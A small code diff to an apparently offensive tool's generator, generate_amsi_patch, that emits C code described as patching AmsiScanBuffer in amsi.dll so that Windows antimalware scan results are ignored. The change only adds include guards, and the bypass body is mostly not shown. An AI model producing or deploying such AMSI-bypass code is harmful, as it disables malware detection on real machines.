@@ -30,6 +30,9 @@ def generate_amsi_patch() -> Dict[str, Any]:
 // Patches AmsiScanBuffer in amsi.dll to return E_INVALIDARG,
 // causing all AMSI scan results to be ignored by the calling host.
 
+#ifndef PHANTOM_PATCH_AMSI_INCLUDED
+#define PHANTOM_PATCH_AMSI_INCLUDED
+
 #include <windows.h>
 
 static BOOL patch_amsi_scan_buffer(void) {
@@ -78,6 +81,8 @@ static BOOL disable_amsi_init(void) {
                    old_protect, &old_protect);
     return TRUE;
 }
+
+#endif /* PHANTOM_PATCH_AMSI_INCLUDED */
 """
 
     return {
